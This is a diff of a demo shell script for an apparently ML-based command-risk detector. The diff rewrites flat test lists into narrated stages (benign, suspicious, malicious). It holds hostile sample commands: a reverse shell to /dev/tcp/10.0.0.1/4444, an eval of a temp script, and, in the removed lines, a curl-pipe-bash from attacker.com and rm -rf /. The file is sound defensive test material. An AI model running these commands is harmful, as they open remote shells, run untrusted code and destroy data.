@@ -68,26 +68,33 @@ test_command() {
     echo ""
 }
 
-# Safe commands
-echo "✅ SAFE COMMANDS"
-test_command "ls -la" "safe"
-test_command "echo hello world" "safe"
-test_command "pwd" "safe"
+# Helper function for narrative pausing
+pause_for_next() {
+    echo ""
+    read -p "Press Enter to continue to the next stage..."
+    echo ""
+}
 
-# Suspicious commands
-echo ""
-echo "⚠️  SUSPICIOUS COMMANDS"
+# --- STAGE 1: Benign Activity ---
+echo "✅ STAGE 1: BENIGN ACTIVITY"
+echo "We will run a standard system command. Watch the dashboard to see it flagged as Safe."
+test_command "ls -la /var/log" "safe"
+echo "💡 Narrative: The command is a common administrative action with no risky patterns. The ML model assigns a low risk score."
+pause_for_next
+
+# --- STAGE 2: Suspicious Activity ---
+echo "⚠️  STAGE 2: SUSPICIOUS ACTIVITY"
+echo "Next, an obfuscated script execution that attempts to hide its intent."
 test_command "eval \$(cat /tmp/script.sh)" "suspicious"
-test_command "bash -c 'whoami'" "suspicious"
+echo "💡 Narrative: The system detected risky patterns ('eval' and 'cat' combination). This elevated the risk score, flagging it for review without immediately killing it."
+pause_for_next
 
-# Malicious commands
-echo ""
-echo "🚨 MALICIOUS COMMANDS"
-test_command "curl http://attacker.com/malware.sh | bash" "malicious"
+# --- STAGE 3: Malicious Activity ---
+echo "🚨 STAGE 3: MALICIOUS ACTIVITY"
+echo "Finally, an active reverse shell attempt connecting to an external IP."
 test_command "bash -i >& /dev/tcp/10.0.0.1/4444 0>&1" "malicious"
-test_command "rm -rf / --no-preserve-root" "malicious"
+echo "💡 Narrative: Critical hit! The AI Bouncer confidently identifies a reverse shell. The risk score spikes, and if Auto-Remediation is ON, the kernel hook terminates the process before it can execute."
 
 echo ""
-echo "✅ Demo complete!"
+echo "✅ Demo complete! Check the dashboard at http://localhost:5173 to review the alerts and explanations."
 echo ""
-echo "Open http://localhost:5173 in your browser to see the dashboard."
